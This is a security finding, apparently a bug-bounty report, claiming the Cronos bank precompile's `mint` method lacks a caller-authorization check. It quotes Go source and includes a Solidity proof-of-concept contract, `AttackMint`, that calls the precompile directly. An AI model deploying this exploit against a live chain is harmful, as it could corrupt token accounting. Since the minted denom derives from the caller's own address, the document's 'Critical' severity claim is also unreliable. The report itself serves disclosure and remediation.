### Title
Unauthorized Mint of Native `evm/` Tokens via Unguarded Bank Precompile `mint` Method — (`File: x/cronos/keeper/precompiles/bank.go`)

### Summary

The `BankContract.Run()` handler in the Cronos bank precompile processes `mint` calls from any EVM caller without verifying that the caller is an authorized/registered CRC20 contract. Any unprivileged EOA or arbitrary contract can call the precompile directly and mint an unlimited supply of native Cosmos bank module tokens with a denom derived from their own address.

### Finding Description

The bank precompile is deployed at address `0x0000000000000000000000000000000000000064` and is callable by any EVM transaction. In `Run()`, the `mint` branch derives the token denom exclusively from `contract.Caller()`:

```go
denom := EVMDenom(contract.Caller())   // "evm/" + caller.Hex()
amt   := sdk.NewCoin(denom, ...)
bc.bankKeeper.MintCoins(ctx, types.ModuleName, sdk.NewCoins(amt))
bc.bankKeeper.SendCoinsFromModuleToAccount(ctx, types.ModuleName, addr, ...)
``` [1](#0-0) 

The only guards present are:

- `readonly` check (line 114) — irrelevant for a normal tx
- `checkBlockedAddr` (line 127) — only checks the *recipient*, not the caller
- `IsSendEnabledCoins` (line 133) — a send-enabled flag, not an authorization check [2](#0-1) 

There is **no check** that `contract.Caller()` corresponds to a registered CRC20/CRC21 contract (e.g., via `GetDenomByContract`). The intended design, as documented in ADR-004 and ADR-008, is that only a deployed CRC20 contract should be able to mint its own paired native denom through this precompile. The `EVMDenom` function simply formats the caller address:

```go
func EVMDenom(token common.Address) string {
    return EVMDenomPrefix + token.Hex()   // "evm/0x..."
}
``` [3](#0-2) 

### Impact Explanation

An unprivileged EOA deploys a contract (or calls the precompile directly) and invokes `mint(recipient, amount)`. The precompile mints `evm/{caller_address}` tokens — real Cosmos SDK bank module native tokens — to any recipient in unlimited quantity. These tokens:

- Exist in the Cosmos bank module state and are transferable
- Can be sent via IBC to other chains as native vouchers
- Corrupt the `evm/` token accounting that the bridge and conversion logic depends on

This is an **unauthorized mint of precompile-controlled assets**, matching the Critical impact category.

### Likelihood Explanation

The bank precompile is at a fixed, well-known address (`0x0000000000000000000000000000000000000064`). [4](#0-3)  Any EVM user can call it directly with a standard `eth_sendTransaction`. No special privilege, leaked key, or cryptographic break is required.

### Recommendation

Before executing the `mint` (or `burn`) path, verify that `contract.Caller()` is a registered CRC20/CRC21 contract by calling `GetDenomByContract` on the cronos keeper and confirming the returned denom matches `EVMDenom(contract.Caller())`. Reject the call if no valid mapping exists. This mirrors the authorization pattern already used in `SendCroToIbcHandler`, which checks `CroBridgeContractAddresses` before acting. [5](#0-4) 

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IBankModule {
    function mint(address recipient, uint256 amount) external returns (bool);
}

contract AttackMint {
    // Bank precompile at fixed address
    IBankModule constant bank = IBankModule(0x0000000000000000000000000000000000000064);

    // Anyone calls this; no registration or permission needed.
    // Mints "evm/<address(this)>" native tokens to `victim` in unlimited quantity.
    function exploit(address victim, uint256 amount) external {
        bank.mint(victim, amount);
    }
}
```

1. Attacker deploys `AttackMint` — its address becomes the denom key `evm/0x<AttackMint>`.
2. Attacker calls `exploit(victim, 1e30)`.
3. `BankContract.Run()` executes `MintCoins` + `SendCoinsFromModuleToAccount` with no caller authorization check.
4. Victim's Cosmos bank balance for `evm/0x<AttackMint>` is inflated by `1e30` units — real native tokens usable for IBC transfers. [6](#0-5)

### Citations

**File:** x/cronos/keeper/precompiles/bank.go (L32-32)
```go
	bankContractAddress     = common.BytesToAddress([]byte{100})
```

**File:** x/cronos/keeper/precompiles/bank.go (L56-58)
```go
func EVMDenom(token common.Address) string {
	return EVMDenomPrefix + token.Hex()
}
```

**File:** x/cronos/keeper/precompiles/bank.go (L113-142)
```go
	case MintMethodName, BurnMethodName:
		if readonly {
			return nil, errors.New("the method is not readonly")
		}
		args, err := method.Inputs.Unpack(contract.Input[4:])
		if err != nil {
			return nil, errors.New("fail to unpack input arguments")
		}
		recipient := args[0].(common.Address)
		amount := args[1].(*big.Int)
		if amount.Sign() <= 0 {
			return nil, errors.New("invalid amount")
		}
		addr := sdk.AccAddress(recipient.Bytes())
		if err := bc.checkBlockedAddr(addr); err != nil {
			return nil, err
		}
		denom := EVMDenom(contract.Caller())
		amt := sdk.NewCoin(denom, sdkmath.NewIntFromBigInt(amount))
		err = stateDB.ExecuteNativeAction(precompileAddr, nil, func(ctx sdk.Context) error {
			if err := bc.bankKeeper.IsSendEnabledCoins(ctx, amt); err != nil {
				return err
			}
			if method.Name == "mint" {
				if err := bc.bankKeeper.MintCoins(ctx, types.ModuleName, sdk.NewCoins(amt)); err != nil {
					return errorsmod.Wrap(err, "fail to mint coins in precompiled contract")
				}
				if err := bc.bankKeeper.SendCoinsFromModuleToAccount(ctx, types.ModuleName, addr, sdk.NewCoins(amt)); err != nil {
					return errorsmod.Wrap(err, "fail to send mint coins to account")
				}
```

**File:** x/cronos/keeper/evmhandlers/send_cro_to_ibc.go (L75-80)
```go
	authorizedBridges := h.cronosKeeper.GetParams(ctx).CroBridgeContractAddresses
	if !slices.ContainsFunc(authorizedBridges, func(addr string) bool {
		return common.HexToAddress(addr) == contract
	}) {
		return fmt.Errorf("contract %s is not authorized to use SendCroToIbc hook", contract)
	}
```
